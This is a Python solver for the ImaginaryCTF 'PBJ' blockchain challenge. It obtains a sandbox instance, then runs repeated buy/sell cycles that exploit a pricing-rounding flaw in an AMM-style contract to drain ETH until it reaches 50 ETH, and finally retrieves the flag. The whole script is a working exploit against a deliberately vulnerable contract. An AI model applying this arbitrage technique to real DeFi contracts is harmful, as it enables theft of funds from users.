#!/usr/bin/env python3
# PBJ all-in-one (auto instancer -> solver -> auto get flag)
# - Robust parser for nc output
# - Deterministic AMM cycle + dynamic probe (escalating small allowed loss)
# - Auto re-instance if state is stubborn
#
# Usage: python3 script.py [--host pbj.chal.imaginaryctf.org] [--port 1337]
# Tunables (ENV):
#   GAS_PRICE_GWEI=14 | TARGET_ETH=50 | MAX_ROUNDS=1200
#   HARD_CAP_PCT=0.90 | MAX_M_CAP=100 | MAX_INSTANCES=25
#   PROBE_SCHEDULE="0.003,0.02,0.10,0.40,0.80,1.20"   (ETH)

import os, sys, re, time, socket, argparse
from typing import Dict, Tuple, Optional
from web3 import Web3
from eth_account import Account
from requests.exceptions import RequestException

# ---------------- TCP / Instancer ----------------
END_HINT = "Please save the provided secret"
ANSI_RX  = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

def strip_ansi(s: str) -> str:
    return ANSI_RX.sub("", s).replace("\r", "")

def recv_until(sock: socket.socket, total_timeout=12.0, idle_timeout=0.5, chunk=4096) -> bytes:
    sock.settimeout(idle_timeout)
    out = bytearray(); start = time.time()
    while True:
        try:
            b = sock.recv(chunk)
            if not b: break
            out.extend(b)
            if END_HINT in out.decode(errors="ignore"): break
        except socket.timeout:
            if time.time() - start > total_timeout: break
        except Exception: break
    return bytes(out)

def expect_and_send(sock: socket.socket, choice: str) -> bytes:
    _ = recv_until(sock)
    sock.sendall(choice.encode() + b"\n")
    return recv_until(sock)

def instancer_get(host: str, port: int) -> Dict[str, str]:
    with socket.create_connection((host, port), timeout=6.0) as s:
        blob = expect_and_send(s, "1")
    text = strip_ansi(blob.decode(errors="ignore"))

    def rx(p): return re.compile(p, re.IGNORECASE | re.MULTILINE)
    out = {}
    m = rx(r"contract\s*address\s*:\s*(0x[0-9a-fA-F]{40})").search(text)
    if m: out["CHALL"] = m.group(1)
    m = rx(r"rpc[-\s]*url\s*:\s*([^\s]+)").search(text)
    if m: out["RPC"] = m.group(1).lstrip()
    m = rx(r"wallet\s*private[-\s]*key\s*:\s*(0x[0-9a-fA-F]+)").search(text)
    if m: out["PRIV"] = m.group(1)
    m = rx(r"wallet\s*address\s*:\s*(0x[0-9a-fA-F]{40})").search(text)
    if m: out["ADDR"] = m.group(1)
    m = rx(r"secret\s*:\s*([0-9a-fA-F]{64})").search(text)
    if m: out["SECRET"] = m.group(1)

    # Fallback heuristics
    if any(k not in out for k in ("CHALL","RPC","PRIV","ADDR","SECRET")):
        addrs = re.findall(r"(0x[0-9a-fA-F]{40})", text)
        if "CHALL" not in out and addrs: out["CHALL"] = addrs[0]
        if "ADDR"  not in out and len(addrs)>1: out["ADDR"] = addrs[1]
        if "PRIV"  not in out:
            pk = re.search(r"(0x[0-9a-fA-F]{64})", text)
            if pk: out["PRIV"] = pk.group(1)
        if "SECRET" not in out:
            sec = re.search(r"\b([0-9a-fA-F]{64})\b", text)
            if sec: out["SECRET"] = sec.group(1)
        if "RPC" not in out:
            rpc = re.search(r"(https?://[^\s]+)", text)
            if rpc: out["RPC"] = rpc.group(1).lstrip()

    miss = [k for k in ("CHALL","RPC","PRIV","ADDR","SECRET") if k not in out]
    if miss: raise RuntimeError(f"Parse miss {miss}:\n{text}")
    return out

def instancer_get_flag(host: str, port: int, secret: str) -> str:
    with socket.create_connection((host, port), timeout=6.0) as s:
        _ = recv_until(s)
        s.sendall(b"2\n")
        _ = recv_until(s)
        s.sendall((secret.strip()+"\n").encode())
        resp = recv_until(s, total_timeout=12.0, idle_timeout=0.6)
    lines = [ln.strip() for ln in strip_ansi(resp.decode(errors="ignore")).splitlines() if ln.strip()]
    return lines[-1] if lines else "(no output)"

# ---------------- On-chain solver ----------------
GAS_LIMIT        = 220000
GAS_PRICE_GWEI   = int(os.environ.get("GAS_PRICE_GWEI", "14"))
RPC_RETRIES      = 2
BACKOFF_BASE     = 0.20
MAX_ROUNDS       = int(os.environ.get("MAX_ROUNDS", "1200"))
HARD_CAP_PCT     = float(os.environ.get("HARD_CAP_PCT", "0.90"))
MAX_M_CAP        = int(os.environ.get("MAX_M_CAP", "100"))
TARGET_ETH       = float(os.environ.get("TARGET_ETH", "50"))
PROBE_SCHEDULE   = [float(x) for x in os.environ.get("PROBE_SCHEDULE", "0.003,0.02,0.10,0.40,0.80,1.20").split(",")]
MAX_INSTANCES    = int(os.environ.get("MAX_INSTANCES", "25"))

ABI = [
  {"inputs": [], "name": "buy", "outputs": [], "stateMutability": "payable", "type": "function"},
  {"inputs":[{"internalType":"uint256","name":"flag","type":"uint256"}],
   "name":"sell","outputs":[],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"uint256","name":"flag","type":"uint256"}],
   "name":"priceForXFlagCoin","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
   "stateMutability":"view","type":"function"},
  {"inputs":[],"name":"isChallSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],
   "stateMutability":"view","type":"function"},
  {"inputs":[],"name":"check_balance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
   "stateMutability":"view","type":"function"},
  {"inputs":[],"name":"eth","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"flagCoin","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
]

def _raw(s): return getattr(s,"rawTransaction",None) or getattr(s,"raw_transaction",None)
def _sleep(i): time.sleep(BACKOFF_BASE*(2**i))
def fmt(wei): 
    sgn="-" if wei<0 else ""; v=-wei if wei<0 else wei
    return f"{sgn}{Web3.from_wei(v,'ether')}"

def rpc_wrap(fn,*a,**k):
    for i in range(RPC_RETRIES):
        try: return fn(*a,**k)
        except (RequestException, ConnectionError): _sleep(i)
        except Exception as e:
            if any(t in str(e) for t in ["Connection refused","Max retries exceeded","timed out","Read timed out"]):
                _sleep(i)
            else: raise
    raise RuntimeError("RPC lỗi liên tục")

def connect_web3(RPC, PRIV, CHALL):
    w3 = Web3(Web3.HTTPProvider(RPC))
    if not w3.is_connected(): raise RuntimeError("Không kết nối được RPC: "+RPC)
    acct = Account.from_key(PRIV)
    c = w3.eth.contract(address=Web3.to_checksum_address(CHALL), abi=ABI)
    return w3, acct, acct.address, c

def fee_params(w3):
    latest = rpc_wrap(w3.eth.get_block, "latest")
    base = latest.get("baseFeePerGas", None)
    if base is not None:
        tip = w3.to_wei(GAS_PRICE_GWEI, "gwei")
        return {"maxPriorityFeePerGas": tip, "maxFeePerGas": base + tip*2}
    return {"gasPrice": w3.to_wei(GAS_PRICE_GWEI, "gwei")}

def bal(w3,a): return rpc_wrap(w3.eth.get_balance, a)
def solved(c,a): return rpc_wrap(lambda: c.functions.isChallSolved().call({"from": a}))
def flags(c,a):  return rpc_wrap(lambda: c.functions.check_balance().call({"from": a}))
def xy(c,a):     return (rpc_wrap(lambda: c.functions.eth().call({"from": a})),
                         rpc_wrap(lambda: c.functions.flagCoin().call({"from": a})))

def delta_for_m(x,y,m):
    if m<=0 or m+1>=y: return -10**30
    k = x*y
    left  = x - (k // (y+m))
    right = (k // (y-(m+1))) - x - 1
    return left - right

def send_pipeline(w3,acct,c,v,m):
    chain = rpc_wrap(lambda: w3.eth.chain_id)
    nonce = rpc_wrap(w3.eth.get_transaction_count, acct.address)
    fees  = fee_params(w3)

    t1 = c.functions.buy().build_transaction({
        "from": acct.address, "nonce": nonce, "gas": GAS_LIMIT,
        "value": v, "chainId": chain, **fees
    })
    s1 = w3.eth.account.sign_transaction(t1, private_key=acct.key)
    raw1=_raw(s1); h1=Web3.keccak(raw1)

    t2 = c.functions.sell(m).build_transaction({
        "from": acct.address, "nonce": nonce+1, "gas": GAS_LIMIT,
        "value": 0, "chainId": chain, **fees
    })
    s2 = w3.eth.account.sign_transaction(t2, private_key=acct.key)
    raw2=_raw(s2); h2=Web3.keccak(raw2)

    for raw in (raw1,raw2):
        ok=False
        for i in range(RPC_RETRIES):
            try:
                rpc_wrap(w3.eth.send_raw_transaction, raw); ok=True; break
            except ValueError as e:
                if any(k in str(e) for k in ["already known","nonce too low","replacement transaction underpriced"]):
                    ok=True; break
                _sleep(i)
            except Exception: _sleep(i)
        if not ok: raise RuntimeError("Không gửi được tx")

    r1 = rpc_wrap(w3.eth.wait_for_transaction_receipt, h1)
    r2 = rpc_wrap(w3.eth.wait_for_transaction_receipt, h2)
    if r1.get("status",0)!=1 or r2.get("status",0)!=1: raise RuntimeError("Tx failed/reverted")

def sell1(w3,acct,c):
    chain=rpc_wrap(lambda: w3.eth.chain_id)
    nonce=rpc_wrap(w3.eth.get_transaction_count, acct.address)
    fees =fee_params(w3)
    t = c.functions.sell(1).build_transaction({
        "from": acct.address, "nonce": nonce, "gas": GAS_LIMIT,
        "value": 0, "chainId": chain, **fees
    })
    s=w3.eth.account.sign_transaction(t, private_key=acct.key)
    raw=_raw(s); h=Web3.keccak(raw)
    rpc_wrap(w3.eth.send_raw_transaction, raw)
    r = rpc_wrap(w3.eth.wait_for_transaction_receipt, h)
    if r.get("status",0)!=1: raise RuntimeError("Tx failed/reverted")

def normalize(w3,acct,addr,c):
    try: f = flags(c,addr)
    except Exception: return
    while f and f>0:
        sell1(w3,acct,c)
        f-=1

def run_solver(RPC,PRIV,CHALL,target_eth:float) -> bool:
    w3,acct,addr,c = connect_web3(RPC,PRIV,CHALL)
    print("Address:", addr)
    print("Start:", fmt(bal(w3,addr)), "ETH")

    # first inspect
    try:
        x0,y0 = xy(c,addr)
        print(f"[inspect] eth()={fmt(x0)} | flagCoin()={y0}")
        for f in range(1, min(7,y0-1)):
            p = rpc_wrap(lambda: c.functions.priceForXFlagCoin(f).call({"from": addr}))
            print(f"[inspect] priceForXFlagCoin({f}) = {fmt(p)}")
    except Exception:
        pass

    normalize(w3,acct,addr,c)

    probe_idx = 0
    for i in range(1, MAX_ROUNDS+1):
        if i % 8 == 0:
            try:
                if solved(c,addr):
                    print("Solved!: bal", fmt(bal(w3,addr)), "ETH")
                    return True
            except Exception:
                pass

        x,y = xy(c,addr)
        bal_now = bal(w3,addr)
        fees=fee_params(w3)
        pergas = fees.get("gasPrice", fees.get("maxFeePerGas"))
        fee2   = pergas * GAS_LIMIT * 2
        avail  = bal_now - fee2
        if avail <= 0:
            print("Không đủ ETH để trả phí.")
            return False

        best=None
        best_nonpos=None
        for m in range(1, min(MAX_M_CAP, y-1)):
            d = delta_for_m(x,y,m)
            k = x*y
            v = (k // (y-(m+1))) - x - 1
            if v <= 0 or v > avail: continue
            if d > 0:
                if best is None or d > best[0]: best=(d,m,v)
            else:
                if (best_nonpos is None) or (d > best_nonpos[0]): best_nonpos=(d,m,v)

        if best is None:
            # escalate probe allowance until we can push state
            pushed = False
            while probe_idx < len(PROBE_SCHEDULE):
                neg_eps_eth = PROBE_SCHEDULE[probe_idx]
                probe_idx += 1
                if best_nonpos is None:
                    break
                d,m,v = best_nonpos
                if d >= -Web3.to_wei(neg_eps_eth,"ether") and v <= bal_now*HARD_CAP_PCT:
                    print(f"[probe≤{neg_eps_eth} ETH] m={m} v={fmt(v)} | Δ≈{fmt(d)}")
                    pre = bal_now
                    try:
                        send_pipeline(w3,acct,c,v,m)
                    except Exception:
                        print(f"[r{i}] skip (tx/RPC fail)"); normalize(w3,acct,addr,c); break
                    post = bal(w3,addr)
                    print(f"[r{i} probe m={m}] pre={fmt(pre)} ETH | post={fmt(post)} ETH | Δ={fmt(post-pre)} ETH")
                    if Web3.from_wei(post,"ether") >= target_eth:
                        print("Target 50+ ETH đạt! bal", fmt(post), "ETH")
                        return True
                    pushed = True
                    break
            if not pushed:
                print("Probe schedule exhausted or unsafe — stop instance.")
                return False
            continue

        d,m,v = best
        pre = bal_now
        try:
            send_pipeline(w3,acct,c,v,m)
        except Exception:
            print(f"[r{i}] skip (tx/RPC fail)")
            normalize(w3,acct,addr,c)
            continue
        post = bal(w3,addr)
        print(f"[r{i} m={m}] pre={fmt(pre)} ETH | post={fmt(post)} ETH | Δ={fmt(post-pre)} ETH")
        if Web3.from_wei(post,"ether") >= target_eth:
            print("Target 50+ ETH đạt! bal", fmt(post), "ETH")
            return True

    print("MAX_ROUNDS reached without target.")
    return False

# ---------------- Main orchestrator ----------------
def main():
    ap = argparse.ArgumentParser(description="PBJ auto-solve & flag")
    ap.add_argument("--host", default="pbj.chal.imaginaryctf.org")
    ap.add_argument("--port", type=int, default=1337)
    args = ap.parse_args()

    # try domain then raw IP
    hosts=[(args.host,args.port)]
    if args.host!="34.45.211.133": hosts.append(("34.45.211.133",args.port))

    tries = 0
    while tries < MAX_INSTANCES:
        tries += 1
        inst=None
        for h,p in hosts:
            try:
                inst = instancer_get(h,p)
                print(f"[+] Instance {tries} @ {h}:{p}")
                break
            except Exception as e:
                print(f"[x] instancer @ {h}:{p} fail: {e}")
        if inst is None:
            print("[x] Không lấy được instance.")
            sys.exit(1)

        RPC,PRIV,CHALL,SECRET = inst["RPC"],inst["PRIV"],inst["CHALL"],inst["SECRET"]
        print(f"CHALL={CHALL}\nRPC={RPC}\nPRIV={PRIV}\nSECRET={SECRET}")

        ok = run_solver(RPC,PRIV,CHALL,TARGET_ETH)
        if not ok:
            print("[i] Instance không thuận lợi — lấy instance mới…")
            continue

        # fetch flag
        for h,p in hosts:
            try:
                flag = instancer_get_flag(h,p,SECRET)
                print(f"[FLAG] {flag}")
                return
            except Exception as e:
                print(f"[x] get-flag @ {h}:{p} fail: {e}")
        print("[x] Không lấy được flag từ cả 2 host.")
        return

    print(f"[x] Đã thử {MAX_INSTANCES} instance mà chưa xong. Tăng MAX_INSTANCES rồi chạy lại.")

if __name__ == "__main__":
    main()
